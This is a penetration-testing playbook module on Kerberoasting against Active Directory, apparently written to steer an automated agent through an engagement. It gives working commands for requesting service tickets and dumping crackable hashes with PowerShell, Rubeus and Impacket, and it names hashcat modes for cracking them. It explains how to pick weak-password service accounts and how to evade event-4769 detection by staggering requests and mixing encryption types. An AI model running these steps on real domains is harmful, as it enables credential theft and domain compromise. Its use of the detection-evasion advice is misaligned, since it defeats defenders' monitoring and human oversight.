# Internal Network, Host, And Identity Operations: Basic Internal Network Attacks: Kerberoasting

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### Kerberoasting

**Prerequisite**: Any authenticated domain user (even low-privileged).

**Theory**: Request a TGS (service ticket) for any SPN. The TGS is encrypted with the service account's NTLM hash. Extract and crack offline.

**How to execute**:
```powershell
# PowerShell (native, lower noise)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/db01.domain.local'

# Then extract with klist, Mimikatz, or Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Impacket (from Linux)
GetUserSPNs.py <domain>/<user>:<password> -request -outputfile hashes.txt
```

**Target selection — not all SPNs are equal:**
- Service accounts running critical services (MSSQL, Exchange, SCCM) — high value
- Accounts with old passwords or naming patterns suggesting weak passwords (e.g., `svc_*`, `service_*`)
- SPNs on user accounts (not dedicated service accounts) — these are config errors, users often have weaker password policies
- krbtgt has no SPN — it cannot be kerberoasted directly, but Silver/Golden Tickets are the related technique

**Cracking**: Hashcat mode 13100 (RC4-HMAC) or 19600/19700 (AES). RC4 is default for TGS from most tools unless AES is specifically requested.

**Detection considerations**: Kerberoasting generates Windows Security Event 4769 (Kerberos service ticket request). High volume of TGS requests with RC4 encryption type (0x17) is a strong detection signal. Stagger requests and mix encryption types.


## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
